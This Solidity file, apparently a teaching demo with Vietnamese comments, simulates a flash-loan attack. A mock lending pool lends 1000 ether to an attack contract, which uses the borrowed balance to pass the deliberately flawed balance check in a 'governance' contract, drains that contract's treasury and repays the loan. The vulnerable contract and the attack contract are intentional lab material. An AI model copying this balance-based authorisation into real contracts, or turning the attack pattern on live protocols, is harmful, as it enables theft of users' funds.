// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

// 1. NGÂN HÀNG MÔ PHỎNG (LENDING POOL)
contract FlashLoanPool {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Ngan hang khong du tien");

        payable(msg.sender).transfer(amount);

        IFlashLoanReceiver(msg.sender).executeOperation(amount);

        uint256 balanceAfter = address(this).balance;
        require(balanceAfter >= balanceBefore, "Ban chua tra lai tien vay!");
    }

    receive() external payable {}
}

interface IFlashLoanReceiver {
    function executeOperation(uint256 amount) external;
}

// 2. NẠN NHÂN (GOVERNANCE)
contract VulnerableGovernance {
    function drainTreasury() external {
        require(address(msg.sender).balance >= 900 ether, "Ban qua ngheo, khong du quyen han!");
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}

// 3. HACKER (ATTACK CONTRACT)
contract FlashLoanAttack is IFlashLoanReceiver {
    FlashLoanPool pool;
    VulnerableGovernance governance;
    address owner;

    // --- ĐÃ SỬA: Thêm 'payable' vào tham số địa chỉ ---
    constructor(address payable _pool, address payable _governance) {
        pool = FlashLoanPool(_pool);
        governance = VulnerableGovernance(_governance);
        owner = msg.sender;
    }
    // -------------------------------------------------

    function attack() external {
        pool.flashLoan(1000 ether);
    }

    function executeOperation(uint256 amount) external override {
        governance.drainTreasury();
        payable(address(pool)).transfer(amount);
        
        uint256 profit = address(this).balance;
        payable(owner).transfer(profit);
    }

    receive() external payable {}
}